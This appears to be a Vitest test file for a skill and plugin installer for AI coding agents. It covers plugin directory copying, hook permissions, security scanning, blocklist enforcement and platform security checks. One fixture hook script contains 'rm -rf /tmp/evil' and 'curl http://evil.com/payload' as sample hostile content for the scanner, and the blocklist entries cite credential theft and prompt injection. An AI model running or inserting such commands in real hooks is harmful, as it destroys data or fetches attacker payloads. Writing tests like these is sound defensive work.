import { describe, it, expect, vi, beforeEach, afterEach } from "vitest";

// ---------------------------------------------------------------------------
// Mock node:fs
// ---------------------------------------------------------------------------
const mockMkdirSync = vi.fn();
const mockWriteFileSync = vi.fn();
const mockReadFileSync = vi.fn();
const mockExistsSync = vi.fn();
const mockCpSync = vi.fn();
const mockChmodSync = vi.fn();
const mockReaddirSync = vi.fn();
const mockStatSync = vi.fn();
const mockCopyFileSync = vi.fn();
const mockRmSync = vi.fn();

vi.mock("node:fs", () => ({
  mkdirSync: (...args: unknown[]) => mockMkdirSync(...args),
  writeFileSync: (...args: unknown[]) => mockWriteFileSync(...args),
  readFileSync: (...args: unknown[]) => mockReadFileSync(...args),
  existsSync: (...args: unknown[]) => mockExistsSync(...args),
  cpSync: (...args: unknown[]) => mockCpSync(...args),
  chmodSync: (...args: unknown[]) => mockChmodSync(...args),
  readdirSync: (...args: unknown[]) => mockReaddirSync(...args),
  statSync: (...args: unknown[]) => mockStatSync(...args),
  copyFileSync: (...args: unknown[]) => mockCopyFileSync(...args),
  rmSync: (...args: unknown[]) => mockRmSync(...args),
}));

// ---------------------------------------------------------------------------
// Mock node:path (pass-through with join tracking)
// ---------------------------------------------------------------------------
vi.mock("node:path", async () => {
  const actual = await vi.importActual<typeof import("node:path")>("node:path");
  return {
    ...actual,
    join: (...args: string[]) => actual.join(...args),
  };
});

// ---------------------------------------------------------------------------
// Mock node:crypto
// ---------------------------------------------------------------------------
const mockDigest = vi.fn().mockReturnValue("abcdef123456xxxx");
const mockUpdate = vi.fn().mockReturnValue({ digest: mockDigest });
vi.mock("node:crypto", () => ({
  createHash: () => ({ update: mockUpdate }),
}));

// ---------------------------------------------------------------------------
// Mock agents registry
// ---------------------------------------------------------------------------
const mockDetectInstalledAgents = vi.fn();
vi.mock("../agents/agents-registry.js", () => ({
  detectInstalledAgents: (...args: unknown[]) => mockDetectInstalledAgents(...args),
  AGENTS_REGISTRY: [
    { id: "claude-code", displayName: "Claude Code", isUniversal: false, parentCompany: "Anthropic", localSkillsDir: ".claude/commands", globalSkillsDir: "~/.claude/commands" },
    { id: "cursor", displayName: "Cursor", isUniversal: false, parentCompany: "Anysphere", localSkillsDir: ".cursor/commands", globalSkillsDir: "~/.cursor/commands" },
  ],
}));

// ---------------------------------------------------------------------------
// Mock lockfile
// ---------------------------------------------------------------------------
const mockEnsureLockfile = vi.fn();
const mockWriteLockfile = vi.fn();
vi.mock("../lockfile/index.js", () => ({
  ensureLockfile: (...args: unknown[]) => mockEnsureLockfile(...args),
  writeLockfile: (...args: unknown[]) => mockWriteLockfile(...args),
}));

// ---------------------------------------------------------------------------
// Mock scanner
// ---------------------------------------------------------------------------
const mockRunTier1Scan = vi.fn();
vi.mock("../scanner/index.js", () => ({
  runTier1Scan: (...args: unknown[]) => mockRunTier1Scan(...args),
}));

// ---------------------------------------------------------------------------
// Mock blocklist
// ---------------------------------------------------------------------------
const mockCheckBlocklist = vi.fn();
const mockCheckInstallSafety = vi.fn();
vi.mock("../blocklist/blocklist.js", () => ({
  checkBlocklist: (...args: unknown[]) => mockCheckBlocklist(...args),
  checkInstallSafety: (...args: unknown[]) => mockCheckInstallSafety(...args),
}));

// ---------------------------------------------------------------------------
// Mock security (platform security check)
// ---------------------------------------------------------------------------
const mockCheckPlatformSecurity = vi.fn();
vi.mock("../security/index.js", () => ({
  checkPlatformSecurity: (...args: unknown[]) => mockCheckPlatformSecurity(...args),
}));

// ---------------------------------------------------------------------------
// Mock API client (registry lookup)
// ---------------------------------------------------------------------------
const mockGetSkill = vi.fn();
vi.mock("../api/client.js", () => ({
  getSkill: (...args: unknown[]) => mockGetSkill(...args),
  reportInstall: vi.fn().mockResolvedValue(undefined),
}));

// ---------------------------------------------------------------------------
// Mock discovery (GitHub Trees skill discovery)
// ---------------------------------------------------------------------------
const mockDiscoverSkills = vi.fn();
vi.mock("../discovery/github-tree.js", () => ({
  discoverSkills: (...args: unknown[]) => mockDiscoverSkills(...args),
}));

// ---------------------------------------------------------------------------
// Mock project root resolution
// ---------------------------------------------------------------------------
const mockFindProjectRoot = vi.fn();
vi.mock("../utils/project-root.js", () => ({
  findProjectRoot: (...args: unknown[]) => mockFindProjectRoot(...args),
}));

// ---------------------------------------------------------------------------
// Mock agent filter (pass-through by default)
// ---------------------------------------------------------------------------
const mockFilterAgents = vi.fn();
vi.mock("../utils/agent-filter.js", () => ({
  filterAgents: (...args: unknown[]) => mockFilterAgents(...args),
}));

// ---------------------------------------------------------------------------
// Mock utils/output (suppress console output in tests)
// ---------------------------------------------------------------------------
vi.mock("../utils/output.js", () => ({
  bold: (s: string) => s,
  green: (s: string) => s,
  red: (s: string) => s,
  yellow: (s: string) => s,
  dim: (s: string) => s,
  cyan: (s: string) => s,
  spinner: () => ({ stop: vi.fn() }),
}));

// ---------------------------------------------------------------------------
// Mock canonical installer
// ---------------------------------------------------------------------------
const mockInstallSymlink = vi.fn().mockReturnValue([]);
const mockInstallCopy = vi.fn().mockReturnValue([]);
vi.mock("../installer/canonical.js", () => ({
  installSymlink: (...args: unknown[]) => mockInstallSymlink(...args),
  installCopy: (...args: unknown[]) => mockInstallCopy(...args),
}));

// ---------------------------------------------------------------------------
// Mock claude-cli (native Claude Code plugin install)
// ---------------------------------------------------------------------------
const mockIsClaudeCliAvailable = vi.fn().mockReturnValue(false);
const mockRegisterMarketplace = vi.fn().mockReturnValue(false);
const mockInstallNativePlugin = vi.fn().mockReturnValue(false);
vi.mock("../utils/claude-cli.js", () => ({
  isClaudeCliAvailable: (...args: unknown[]) => mockIsClaudeCliAvailable(...args),
  registerMarketplace: (...args: unknown[]) => mockRegisterMarketplace(...args),
  installNativePlugin: (...args: unknown[]) => mockInstallNativePlugin(...args),
  uninstallNativePlugin: vi.fn().mockReturnValue(false),
}));

// ---------------------------------------------------------------------------
// Mock getMarketplaceName (preserve real marketplace functions)
// ---------------------------------------------------------------------------
const mockGetMarketplaceName = vi.fn().mockReturnValue(null);
vi.mock("../marketplace/index.js", async () => {
  const actual = await vi.importActual<typeof import("../marketplace/index.js")>("../marketplace/index.js");
  return {
    ...actual,
    getMarketplaceName: (...args: unknown[]) => mockGetMarketplaceName(...args),
  };
});

// ---------------------------------------------------------------------------
// Import module under test AFTER mocks
// ---------------------------------------------------------------------------
const { addCommand } = await import("./add.js");

// ---------------------------------------------------------------------------
// Helpers
// ---------------------------------------------------------------------------

function makeScanResult(overrides: Record<string, unknown> = {}) {
  return {
    verdict: "PASS",
    findings: [],
    score: 100,
    patternsChecked: 37,
    criticalCount: 0,
    highCount: 0,
    mediumCount: 0,
    lowCount: 0,
    infoCount: 0,
    durationMs: 1,
    ...overrides,
  };
}

function makeAgent(overrides: Record<string, unknown> = {}) {
  return {
    id: "claude-code",
    displayName: "Claude Code",
    localSkillsDir: ".claude/commands",
    globalSkillsDir: "~/.claude/commands",
    ...overrides,
  };
}

// ---------------------------------------------------------------------------
// Tests
// ---------------------------------------------------------------------------

beforeEach(() => {
  vi.clearAllMocks();
  // Suppress console output during tests
  vi.spyOn(console, "log").mockImplementation(() => {});
  vi.spyOn(console, "error").mockImplementation(() => {});
  // Default: platform security returns null (non-fatal, no external results)
  mockCheckPlatformSecurity.mockResolvedValue(null);
  // Default: findProjectRoot returns cwd (same as old behavior)
  mockFindProjectRoot.mockReturnValue(process.cwd());
  // Default: filterAgents passes through agents unchanged
  mockFilterAgents.mockImplementation((agents: unknown[]) => agents);
});

describe("addCommand with --plugin option (plugin directory support)", () => {
  beforeEach(() => {
    // Plugin path hits blocklist check first — return null (not blocked)
    mockCheckInstallSafety.mockResolvedValue({ blocked: false, rejected: false });
  });

  // TC-001: --plugin <name> flag selects sub-plugin from multi-plugin repo
  describe("TC-001: plugin flag selects sub-plugin directory", () => {
    it("selects the sw-frontend plugin directory from a local path with plugins/ structure", async () => {
      const localPath = "/tmp/test-repo";

      // The plugin directory path: /tmp/test-repo/plugins/specweave-frontend/
      mockExistsSync.mockImplementation((p: string) => {
        if (p.includes("plugins/specweave-frontend")) return true;
        if (p.includes(".claude-plugin/marketplace.json")) return true;
        return false;
      });

      mockReadFileSync.mockImplementation((p: string) => {
        if (p.includes("marketplace.json")) {
          return JSON.stringify({
            name: "specweave",
            version: "1.0.225",
            plugins: [
              { name: "sw", source: "./plugins/specweave", version: "1.0.225" },
              { name: "sw-frontend", source: "./plugins/specweave-frontend", version: "1.0.0" },
            ],
          });
        }
        return "";
      });

      // readdirSync: recursive for collectPluginContent, non-recursive for copyPluginFiltered
      mockReaddirSync.mockImplementation((_dir: string, opts?: unknown) => {
        if (typeof opts === "object" && opts !== null && (opts as Record<string, unknown>).recursive) {
          return ["skills/SKILL.md", "hooks/setup.sh"];
        }
        // copyPluginFiltered calls readdirSync without recursive
        return ["SKILL.md"];
      });

      // statSync for copyPluginFiltered: treat everything as a file
      mockStatSync.mockReturnValue({ isDirectory: () => false, isFile: () => true });

      mockRunTier1Scan.mockReturnValue(makeScanResult());
      mockDetectInstalledAgents.mockResolvedValue([makeAgent()]);
      mockEnsureLockfile.mockReturnValue({
        version: 1,
        agents: [],
        skills: {},
        createdAt: "2026-01-01T00:00:00.000Z",
        updatedAt: "2026-01-01T00:00:00.000Z",
      });

      // Call addCommand with plugin option and pluginDir (local source)
      await addCommand(localPath, { plugin: "sw-frontend", pluginDir: localPath });

      // copyFileSync should have been called (copyPluginFiltered uses it)
      expect(mockCopyFileSync).toHaveBeenCalled();
      const cpCall = mockCopyFileSync.mock.calls[0];
      // Source should include plugins/specweave-frontend
      expect(cpCall[0]).toContain("plugins/specweave-frontend");
    });
  });

  // TC-002: Full directory structure preserved on installation
  describe("TC-002: full directory structure is preserved", () => {
    it("recursively copies all subdirectories (skills, hooks, commands, agents, .claude-plugin) to cache", async () => {
      const localPath = "/tmp/test-plugin";

      mockExistsSync.mockReturnValue(true);
      mockReadFileSync.mockImplementation((p: string) => {
        if (p.includes("marketplace.json")) {
          return JSON.stringify({
            name: "specweave",
            version: "1.0.0",
            plugins: [
              { name: "sw-frontend", source: "./plugins/specweave-frontend", version: "1.0.0" },
            ],
          });
        }
        return "# Plugin content";
      });

      // copyPluginFiltered walks the tree: top-level has dirs, each dir has a file
      let depth = 0;
      mockReaddirSync.mockImplementation((_dir: string, opts?: unknown) => {
        // collectPluginContent uses { recursive: true }
        if (typeof opts === "object" && opts !== null && (opts as Record<string, unknown>).recursive) {
          return ["skills/SKILL.md", "hooks/setup.sh"];
        }
        // copyPluginFiltered: first call returns subdirs, deeper calls return files
        if (depth === 0) {
          depth++;
          return ["skills", "hooks"];
        }
        return ["SKILL.md"];
      });

      mockStatSync.mockImplementation((p: string) => ({
        isDirectory: () => p.endsWith("skills") || p.endsWith("hooks"),
        isFile: () => !p.endsWith("skills") && !p.endsWith("hooks"),
      }));

      mockRunTier1Scan.mockReturnValue(makeScanResult());
      mockDetectInstalledAgents.mockResolvedValue([makeAgent()]);
      mockEnsureLockfile.mockReturnValue({
        version: 1,
        agents: [],
        skills: {},
        createdAt: "2026-01-01T00:00:00.000Z",
        updatedAt: "2026-01-01T00:00:00.000Z",
      });

      await addCommand(localPath, { plugin: "sw-frontend", pluginDir: localPath });

      // mkdirSync is called for each directory level (recursive copy)
      expect(mockMkdirSync).toHaveBeenCalled();
      // copyFileSync is called for files within subdirectories
      expect(mockCopyFileSync).toHaveBeenCalled();
      // Verify it created subdirectory structure
      const mkdirCalls = mockMkdirSync.mock.calls.map((c: unknown[]) => String(c[0]));
      expect(mkdirCalls.some((p: string) => p.includes("skills") || p.includes("hooks"))).toBe(true);
    });
  });

  // TC-003: Hook script permissions fixed
  describe("TC-003: hook scripts get executable permission", () => {
    it("sets chmod 0o755 on all .sh files in hooks/ after install", async () => {
      const localPath = "/tmp/test-plugin";

      mockExistsSync.mockReturnValue(true);
      mockReadFileSync.mockImplementation((p: string) => {
        if (p.includes("marketplace.json")) {
          return JSON.stringify({
            name: "specweave",
            version: "1.0.0",
            plugins: [
              { name: "sw-frontend", source: "./plugins/specweave-frontend", version: "1.0.0" },
            ],
          });
        }
        return "# Hook content";
      });

      // When scanning for .sh files in the installed directory
      mockReaddirSync.mockImplementation((dir: string, opts?: unknown) => {
        // Return file entries when called with recursive option
        if (typeof opts === "object" && opts !== null && (opts as Record<string, unknown>).recursive) {
          return [
            "hooks/pre-install.sh",
            "hooks/post-install.sh",
            "skills/SKILL.md",
            "commands/init.md",
          ];
        }
        return [];
      });

      mockRunTier1Scan.mockReturnValue(makeScanResult());
      mockDetectInstalledAgents.mockResolvedValue([makeAgent()]);
      mockEnsureLockfile.mockReturnValue({
        version: 1,
        agents: [],
        skills: {},
        createdAt: "2026-01-01T00:00:00.000Z",
        updatedAt: "2026-01-01T00:00:00.000Z",
      });

      await addCommand(localPath, { plugin: "sw-frontend", pluginDir: localPath });

      // chmodSync should be called for each .sh file with 0o755
      const chmodCalls = mockChmodSync.mock.calls;
      const shCalls = chmodCalls.filter(
        (call: unknown[]) => typeof call[0] === "string" && (call[0] as string).endsWith(".sh")
      );
      expect(shCalls.length).toBeGreaterThanOrEqual(2);
      for (const call of shCalls) {
        expect(call[1]).toBe(0o755);
      }
    });
  });

  // TC-004: Security scanning covers all plugin files
  describe("TC-004: security scan covers all plugin files", () => {
    it("scans concatenated content from all plugin files, not just SKILL.md", async () => {
      const localPath = "/tmp/test-plugin";

      mockExistsSync.mockReturnValue(true);

      const hookContent = "#!/bin/bash\nrm -rf /tmp/evil\ncurl http://evil.com/payload";
      const skillContent = "# My Skill\nSafe content here";

      mockReadFileSync.mockImplementation((p: string) => {
        if (p.includes("marketplace.json")) {
          return JSON.stringify({
            name: "specweave",
            version: "1.0.0",
            plugins: [
              { name: "sw-frontend", source: "./plugins/specweave-frontend", version: "1.0.0" },
            ],
          });
        }
        if (p.includes("hooks/")) return hookContent;
        if (p.includes("SKILL.md")) return skillContent;
        return "";
      });

      mockReaddirSync.mockImplementation((dir: string, opts?: unknown) => {
        if (typeof opts === "object" && opts !== null && (opts as Record<string, unknown>).recursive) {
          return [
            "hooks/deploy.sh",
            "skills/SKILL.md",
          ];
        }
        return [];
      });

      // The scan should receive concatenated content from all files
      mockRunTier1Scan.mockReturnValue(
        makeScanResult({
          verdict: "FAIL",
          score: 20,
          findings: [
            {
              patternId: "FS-001",
              patternName: "Recursive delete",
              severity: "critical",
              category: "filesystem-access",
              match: "rm -rf",
              lineNumber: 2,
              context: "rm -rf /tmp/evil",
            },
            {
              patternId: "NA-001",
              patternName: "Curl/wget to unknown host",
              severity: "high",
              category: "network-access",
              match: 'curl http://evil.com/payload',
              lineNumber: 3,
              context: "curl http://evil.com/payload",
            },
          ],
          criticalCount: 1,
          highCount: 1,
        })
      );

      mockDetectInstalledAgents.mockResolvedValue([makeAgent()]);
      mockEnsureLockfile.mockReturnValue({
        version: 1,
        agents: [],
        skills: {},
        createdAt: "2026-01-01T00:00:00.000Z",
        updatedAt: "2026-01-01T00:00:00.000Z",
      });

      // Force install despite failure to reach lockfile update
      await addCommand(localPath, {
        plugin: "sw-frontend",
        pluginDir: localPath,
        force: true,
      });

      // runTier1Scan should have been called with content containing hook file data
      expect(mockRunTier1Scan).toHaveBeenCalled();
      const scannedContent = mockRunTier1Scan.mock.calls[0][0] as string;
      // The scanned content should include hook file content (rm -rf, curl)
      expect(scannedContent).toContain("rm -rf");
      expect(scannedContent).toContain("curl");
    });
  });
});

// ---------------------------------------------------------------------------
// T-013: Blocklist check in GitHub path
// ---------------------------------------------------------------------------

describe("addCommand blocklist check (GitHub path)", () => {
  // Mock global fetch for GitHub path tests
  const originalFetch = globalThis.fetch;

  beforeEach(() => {
    globalThis.fetch = vi.fn().mockResolvedValue({
      ok: true,
      text: async () => "# Safe Skill\nNormal content",
    }) as unknown as typeof fetch;
  });

  afterEach(() => {
    globalThis.fetch = originalFetch;
  });

  it("blocks installation when skill is on the blocklist", async () => {
    mockCheckInstallSafety.mockResolvedValue({
      blocked: true,
      entry: {
        skillName: "evil-repo",
        threatType: "credential-theft",
        severity: "critical",
        reason: "Steals AWS credentials",
        evidenceUrls: [],
        discoveredAt: "2026-02-01T00:00:00Z",
      },
      rejected: false,
    });

    const mockExit = vi.spyOn(process, "exit").mockImplementation(() => {
      throw new Error("process.exit");
    });

    await expect(
      addCommand("owner/evil-repo", {}),
    ).rejects.toThrow("process.exit");

    expect(mockCheckInstallSafety).toHaveBeenCalledWith("evil-repo");
    expect(mockExit).toHaveBeenCalledWith(1);

    // Tier 1 scan should NOT have been called (blocked before scan)
    expect(mockRunTier1Scan).not.toHaveBeenCalled();

    const errorOutput = (console.error as ReturnType<typeof vi.fn>).mock.calls
      .map((c: unknown[]) => String(c[0]))
      .join("\n");
    expect(errorOutput).toContain("BLOCKED");
    expect(errorOutput).toContain("credential-theft");
    expect(errorOutput).toContain("https://verified-skill.com/skills/evil-repo");

    mockExit.mockRestore();
  });

  it("proceeds normally when skill is NOT on the blocklist", async () => {
    mockCheckInstallSafety.mockResolvedValue({ blocked: false, rejected: false });
    mockRunTier1Scan.mockReturnValue(makeScanResult());
    mockDetectInstalledAgents.mockResolvedValue([makeAgent()]);
    mockEnsureLockfile.mockReturnValue({
      version: 1,
      agents: [],
      skills: {},
      createdAt: "2026-01-01T00:00:00.000Z",
      updatedAt: "2026-01-01T00:00:00.000Z",
    });

    await addCommand("owner/safe-repo", {});

    expect(mockCheckInstallSafety).toHaveBeenCalledWith("safe-repo");
    expect(mockRunTier1Scan).toHaveBeenCalled();
  });

  it("uses --skill name for blocklist check when provided", async () => {
    mockCheckInstallSafety.mockResolvedValue({ blocked: false, rejected: false });
    mockRunTier1Scan.mockReturnValue(makeScanResult());
    mockDetectInstalledAgents.mockResolvedValue([makeAgent()]);
    mockEnsureLockfile.mockReturnValue({
      version: 1,
      agents: [],
      skills: {},
      createdAt: "2026-01-01T00:00:00.000Z",
      updatedAt: "2026-01-01T00:00:00.000Z",
    });

    await addCommand("owner/repo", { skill: "my-skill" });

    expect(mockCheckInstallSafety).toHaveBeenCalledWith("my-skill");
  });
});

// ---------------------------------------------------------------------------
// T-014: Blocklist check in plugin path
// ---------------------------------------------------------------------------

describe("addCommand blocklist check (plugin path)", () => {
  it("blocks plugin installation when plugin is on the blocklist", async () => {
    mockCheckInstallSafety.mockResolvedValue({
      blocked: true,
      entry: {
        skillName: "evil-plugin",
        threatType: "prompt-injection",
        severity: "critical",
        reason: "Injects malicious prompts",
        evidenceUrls: [],
        discoveredAt: "2026-02-01T00:00:00Z",
      },
      rejected: false,
    });

    mockExistsSync.mockReturnValue(true);
    mockReadFileSync.mockImplementation((p: string) => {
      if (p.includes("marketplace.json")) {
        return JSON.stringify({
          name: "test",
          version: "1.0.0",
          plugins: [
            { name: "evil-plugin", source: "./plugins/evil-plugin", version: "1.0.0" },
          ],
        });
      }
      return "";
    });

    const mockExit = vi.spyOn(process, "exit").mockImplementation(() => {
      throw new Error("process.exit");
    });

    await expect(
      addCommand("source", { plugin: "evil-plugin", pluginDir: "/tmp/test" }),
    ).rejects.toThrow("process.exit");

    expect(mockCheckInstallSafety).toHaveBeenCalledWith("evil-plugin");
    expect(mockRunTier1Scan).not.toHaveBeenCalled();

    mockExit.mockRestore();
  });

  it("proceeds with plugin installation when not blocklisted", async () => {
    mockCheckInstallSafety.mockResolvedValue({ blocked: false, rejected: false });
    mockExistsSync.mockReturnValue(true);
    mockReadFileSync.mockImplementation((p: string) => {
      if (p.includes("marketplace.json")) {
        return JSON.stringify({
          name: "test",
          version: "1.0.0",
          plugins: [
            { name: "safe-plugin", source: "./plugins/safe-plugin", version: "1.0.0" },
          ],
        });
      }
      return "";
    });

    mockReaddirSync.mockReturnValue(["SKILL.md"]);
    mockRunTier1Scan.mockReturnValue(makeScanResult());
    mockDetectInstalledAgents.mockResolvedValue([makeAgent()]);
    mockEnsureLockfile.mockReturnValue({
      version: 1,
      agents: [],
      skills: {},
      createdAt: "2026-01-01T00:00:00.000Z",
      updatedAt: "2026-01-01T00:00:00.000Z",
    });

    await addCommand("source", { plugin: "safe-plugin", pluginDir: "/tmp/test" });

    expect(mockCheckInstallSafety).toHaveBeenCalledWith("safe-plugin");
    expect(mockRunTier1Scan).toHaveBeenCalled();
  });
});

// ---------------------------------------------------------------------------
// T-015: --force does NOT override blocked skills
// ---------------------------------------------------------------------------

describe("addCommand --force with blocked skill", () => {
  const originalFetch = globalThis.fetch;

  beforeEach(() => {
    globalThis.fetch = vi.fn().mockResolvedValue({
      ok: true,
      text: async () => "# Skill content",
    }) as unknown as typeof fetch;
  });

  afterEach(() => {
    globalThis.fetch = originalFetch;
  });

  it("still blocks even with --force (GitHub path)", async () => {
    mockCheckInstallSafety.mockResolvedValue({
      blocked: true,
      entry: {
        skillName: "evil-skill",
        threatType: "credential-theft",
        severity: "critical",
        reason: "Base64-encoded AWS credential exfil",
        evidenceUrls: [],
        discoveredAt: "2026-02-01T00:00:00Z",
      },
      rejected: false,
    });

    const mockExit = vi.spyOn(process, "exit").mockImplementation(() => {
      throw new Error("process.exit");
    });

    await expect(
      addCommand("owner/evil-skill", { force: true }),
    ).rejects.toThrow("process.exit");

    // Should NOT proceed to tier 1 scan — blocked is absolute
    expect(mockExit).toHaveBeenCalledWith(1);
    expect(mockRunTier1Scan).not.toHaveBeenCalled();

    const errorOutput = (console.error as ReturnType<typeof vi.fn>).mock.calls
      .map((c: unknown[]) => String(c[0]))
      .join("\n");
    expect(errorOutput).toContain("BLOCKED");
    expect(errorOutput).toContain("https://verified-skill.com/skills/evil-skill");

    mockExit.mockRestore();
  });

  it("still blocks even with --force (plugin path)", async () => {
    mockCheckInstallSafety.mockResolvedValue({
      blocked: true,
      entry: {
        skillName: "evil-plugin",
        threatType: "prompt-injection",
        severity: "critical",
        reason: "Injects malicious prompts",
        evidenceUrls: [],
        discoveredAt: "2026-02-01T00:00:00Z",
      },
      rejected: false,
    });

    mockExistsSync.mockReturnValue(true);
    mockReadFileSync.mockImplementation((p: string) => {
      if (p.includes("marketplace.json")) {
        return JSON.stringify({
          name: "test",
          version: "1.0.0",
          plugins: [
            { name: "evil-plugin", source: "./plugins/evil-plugin", version: "1.0.0" },
          ],
        });
      }
      return "";
    });

    const mockExit = vi.spyOn(process, "exit").mockImplementation(() => {
      throw new Error("process.exit");
    });

    await expect(
      addCommand("source", { plugin: "evil-plugin", pluginDir: "/tmp/test", force: true }),
    ).rejects.toThrow("process.exit");

    expect(mockExit).toHaveBeenCalledWith(1);
    expect(mockRunTier1Scan).not.toHaveBeenCalled();

    mockExit.mockRestore();
  });
});

// ---------------------------------------------------------------------------
// T-015b: Rejected skill shows warning but proceeds with installation
// ---------------------------------------------------------------------------

describe("addCommand with rejected skill", () => {
  const originalFetch = globalThis.fetch;

  beforeEach(() => {
    globalThis.fetch = vi.fn().mockResolvedValue({
      ok: true,
      text: async () => "# Rejected Skill\nContent here",
    }) as unknown as typeof fetch;
  });

  afterEach(() => {
    globalThis.fetch = originalFetch;
  });

  it("shows warning with details link but proceeds (GitHub path)", async () => {
    mockCheckInstallSafety.mockResolvedValue({
      blocked: false,
      rejected: true,
      rejection: {
        skillName: "sketchy-skill",
        state: "REJECTED",
        reason: "Verification failed (REJECTED)",
        score: 25,
        rejectedAt: "2026-02-25T05:26:33.762Z",
      },
    });

    mockRunTier1Scan.mockReturnValue(makeScanResult());
    mockDetectInstalledAgents.mockResolvedValue([makeAgent()]);
    mockEnsureLockfile.mockReturnValue({
      version: 1,
      agents: [],
      skills: {},
      createdAt: "2026-01-01T00:00:00.000Z",
      updatedAt: "2026-01-01T00:00:00.000Z",
    });

    await addCommand("owner/sketchy-skill", {});

    // Should show warning
    const errorOutput = (console.error as ReturnType<typeof vi.fn>).mock.calls
      .map((c: unknown[]) => String(c[0]))
      .join("\n");
    expect(errorOutput).toContain("WARNING");
    expect(errorOutput).toContain("failed platform verification");
    expect(errorOutput).toContain("25/100");
    expect(errorOutput).toContain("https://verified-skill.com/skills/sketchy-skill");

    // Should still proceed to tier 1 scan and install
    expect(mockRunTier1Scan).toHaveBeenCalled();
  });
});

// ---------------------------------------------------------------------------
// T-016/T-017: Platform security check in GitHub path
// ---------------------------------------------------------------------------

describe("addCommand platform security check (GitHub path)", () => {
  const originalFetch = globalThis.fetch;

  beforeEach(() => {
    globalThis.fetch = vi.fn().mockResolvedValue({
      ok: true,
      text: async () => "# Safe Skill\nNormal content",
    }) as unknown as typeof fetch;

    mockCheckInstallSafety.mockResolvedValue({ blocked: false, rejected: false });
  });

  afterEach(() => {
    globalThis.fetch = originalFetch;
  });

  it("blocks installation when platform reports CRITICAL findings", async () => {
    mockCheckPlatformSecurity.mockResolvedValue({
      hasCritical: true,
      overallVerdict: "FAIL",
      providers: [
        { provider: "semgrep", status: "FAIL", verdict: "critical", criticalCount: 3 },
        { provider: "snyk", status: "PASS", verdict: "clean", criticalCount: 0 },
      ],
      reportUrl: "/skills/evil-skill/security",
    });

    const mockExit = vi.spyOn(process, "exit").mockImplementation(() => {
      throw new Error("process.exit");
    });

    await expect(
      addCommand("owner/evil-skill", {}),
    ).rejects.toThrow("process.exit");

    expect(mockExit).toHaveBeenCalledWith(1);

    const errorOutput = (console.error as ReturnType<typeof vi.fn>).mock.calls
      .map((c: unknown[]) => String(c[0]))
      .join("\n");
    expect(errorOutput).toContain("BLOCKED");
    expect(errorOutput).toContain("CRITICAL");
    expect(errorOutput).toContain("semgrep");

    // Should NOT proceed to tier 1 scan
    expect(mockRunTier1Scan).not.toHaveBeenCalled();

    mockExit.mockRestore();
  });

  it("shows warning and proceeds when CRITICAL + --force", async () => {
    mockCheckPlatformSecurity.mockResolvedValue({
      hasCritical: true,
      overallVerdict: "FAIL",
      providers: [
        { provider: "semgrep", status: "FAIL", verdict: "critical", criticalCount: 2 },
      ],
      reportUrl: "/skills/evil-skill/security",
    });

    mockRunTier1Scan.mockReturnValue(makeScanResult());
    mockDetectInstalledAgents.mockResolvedValue([makeAgent()]);
    mockEnsureLockfile.mockReturnValue({
      version: 1,
      agents: [],
      skills: {},
      createdAt: "2026-01-01T00:00:00.000Z",
      updatedAt: "2026-01-01T00:00:00.000Z",
    });

    await addCommand("owner/evil-skill", { force: true });

    const errorOutput = (console.error as ReturnType<typeof vi.fn>).mock.calls
      .map((c: unknown[]) => String(c[0]))
      .join("\n");
    expect(errorOutput).toContain("WARNING");
    expect(errorOutput).toContain("CRITICAL");
    expect(errorOutput).toContain("semgrep");

    // Should proceed to tier 1 scan
    expect(mockRunTier1Scan).toHaveBeenCalled();
  });

  it("shows info message and proceeds when scans are PENDING", async () => {
    mockCheckPlatformSecurity.mockResolvedValue({
      hasCritical: false,
      overallVerdict: "PENDING",
      providers: [
        { provider: "semgrep", status: "PENDING", verdict: null, criticalCount: 0 },
      ],
      reportUrl: "/skills/test-skill/security",
    });

    mockRunTier1Scan.mockReturnValue(makeScanResult());
    mockDetectInstalledAgents.mockResolvedValue([makeAgent()]);
    mockEnsureLockfile.mockReturnValue({
      version: 1,
      agents: [],
      skills: {},
      createdAt: "2026-01-01T00:00:00.000Z",
      updatedAt: "2026-01-01T00:00:00.000Z",
    });

    await addCommand("owner/test-skill", {});

    const logOutput = (console.log as ReturnType<typeof vi.fn>).mock.calls
      .map((c: unknown[]) => String(c[0]))
      .join("\n");
    expect(logOutput).toContain("pending");

    // Should proceed to tier 1 scan
    expect(mockRunTier1Scan).toHaveBeenCalled();
  });

  it("proceeds normally when platform check returns null (network error)", async () => {
    mockCheckPlatformSecurity.mockResolvedValue(null);

    mockRunTier1Scan.mockReturnValue(makeScanResult());
    mockDetectInstalledAgents.mockResolvedValue([makeAgent()]);
    mockEnsureLockfile.mockReturnValue({
      version: 1,
      agents: [],
      skills: {},
      createdAt: "2026-01-01T00:00:00.000Z",
      updatedAt: "2026-01-01T00:00:00.000Z",
    });

    await addCommand("owner/safe-skill", {});

    // Should proceed to tier 1 scan without any blocking
    expect(mockRunTier1Scan).toHaveBeenCalled();
  });
});

// ---------------------------------------------------------------------------
// Multi-skill repo discovery + install
// ---------------------------------------------------------------------------

describe("addCommand multi-skill discovery (GitHub path)", () => {
  const originalFetch = globalThis.fetch;

  beforeEach(() => {
    mockCheckInstallSafety.mockResolvedValue({ blocked: false, rejected: false });
    mockCheckPlatformSecurity.mockResolvedValue(null);
    mockRunTier1Scan.mockReturnValue(makeScanResult());
    mockDetectInstalledAgents.mockResolvedValue([makeAgent()]);
    mockEnsureLockfile.mockReturnValue({
      version: 1,
      agents: [],
      skills: {},
      createdAt: "2026-01-01T00:00:00.000Z",
      updatedAt: "2026-01-01T00:00:00.000Z",
    });
  });

  afterEach(() => {
    globalThis.fetch = originalFetch;
  });

  // TC-007: Multi-skill repo installs all discovered skills
  it("installs all discovered skills from a multi-skill repo", async () => {
    mockDiscoverSkills.mockResolvedValue([
      { name: "repo", path: "SKILL.md", rawUrl: "https://raw.githubusercontent.com/owner/repo/main/SKILL.md" },
      { name: "foo", path: "skills/foo/SKILL.md", rawUrl: "https://raw.githubusercontent.com/owner/repo/main/skills/foo/SKILL.md" },
      { name: "bar", path: "skills/bar/SKILL.md", rawUrl: "https://raw.githubusercontent.com/owner/repo/main/skills/bar/SKILL.md" },
    ]);

    // Each fetch for individual SKILL.md content succeeds
    globalThis.fetch = vi.fn().mockResolvedValue({
      ok: true,
      text: async () => "# Skill content",
    }) as unknown as typeof fetch;

    await addCommand("owner/repo", {});

    // Should have fetched 3 SKILL.md files
    expect(globalThis.fetch).toHaveBeenCalledTimes(3);
    // Should have scanned 3 skills
    expect(mockRunTier1Scan).toHaveBeenCalledTimes(3);
    // Lockfile should have 3 entries
    expect(mockWriteLockfile).toHaveBeenCalled();
    const lockArg = mockWriteLockfile.mock.calls[0][0];
